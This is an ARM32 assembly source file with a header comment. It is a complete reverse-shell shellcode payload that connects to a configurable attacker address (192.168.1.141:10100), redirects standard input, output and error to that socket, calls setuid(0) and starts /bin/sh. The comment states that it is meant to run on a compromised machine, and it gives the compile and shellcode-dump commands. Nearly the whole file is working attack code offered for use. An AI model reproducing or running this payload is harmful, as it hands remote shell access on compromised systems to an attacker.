/*

Author: Abhinav Thakur
File:   setuid_reverse_shell.s

PoE:
	This machine code when executed on a compromised machine, sends a shell to attacker-specified 
	IP address. Both, shell and attacker IP address (IP + PORT) is configurable @shellPath and 
	@attackerAddr in this file.

Compile:
	$ arm-linux-gnueabi-gcc -Wl,-N -nostdlib -static setuid_reverse_shell.s -o ./setuid_reverse_shell.elf
Dump shellcode :
	$ arm-linux-gnueabi-objcopy --dump-section .text=setuid_reverse_shell.raw ./setuid_reverse_shell.elf
Run            :
	$ ./setuid_reverse_shell.elf

~~ SYSCALL conventions for ARM32
move parameters into => r0, r1, r2, r3, r4, r5
move syscall number  => r7
find return value in => r0

~~ TRACING SYSCALLS
socket(0x2, 0x1, 0)                     = 3
connect(3, {sa_family=0x2, sin_port="\x27\x74", sin_addr="\xc0\xa8\x01\x8d"}, 16) = 0
dup2(3, 0)                              = 0
dup2(3, 1)                              = 1
dup2(3, 2)                              = 2
setuid(0)								= 0
execve("/bin/sh", [], 0x1442620) = 0

*/

.global _start
_start:

	.code 32
	add r3, pc, #1
	bx r3

	.code 16
	// socket (2, 1, 0);    => syscall number = 281
	mov r7, #240
	add r7, r7, #41         // r7 = 281
	mov r0, #2				// Protocol family (Internet Socket) - PF_INET (2)
	mov r1, #1              // Socket type (Stream Socket) - SOCK_STREAM (1)
	eor r2, r2, r2          // options - 0
	svc #1

	mov r5, r0				// save socket fd
	
	// connect (socket_fd, {2, "\x27\x74", "\xc0\xa8\x01\x8d"}, 16);	=> 192.168.1.141
	mov r7, #240
	add r7, #43				// r7 = 283
	eor r3, r3, r3
	adr r1, attackerAddr
	strb r3, [r1, #1]		// fixup attackerAddr structure to store NULL byte values at runtime
	mov r2, #16
	svc #1

	// dup2 (socket_fd, newfd);
	mov r7, #63
	eor r1, r1, r1			// initialize r1 (newfd) = 0
again:
	mov r0, r5
	svc #1
	add r1, r1, #1			// ++r1
	cmp r1, #2
	ble again				// if (r1 <= 2) goto again

	// setuid (0)
	mov r7, #23
	eor r0, r0, r0
	svc #1

	// execve ("/bin/sh", 0, 0)
	mov r7, #11
	eor r1, r1, r1
	eor r2, r2, r2
	adr r0, shellPath
	strb r2, [r0, #7]
	svc #1

.align 2
attackerAddr:
.ascii "\x02\xff"			// Address Family = internet socket
.ascii "\x27\x74"			// configured Port = 10100 (0x2774)
.ascii "\xc0\xa8\x01\x8d"	// configured IP Address = 192.168.1.141 (0xc0a8018d)
shellPath:
.ascii "/bin/shX"
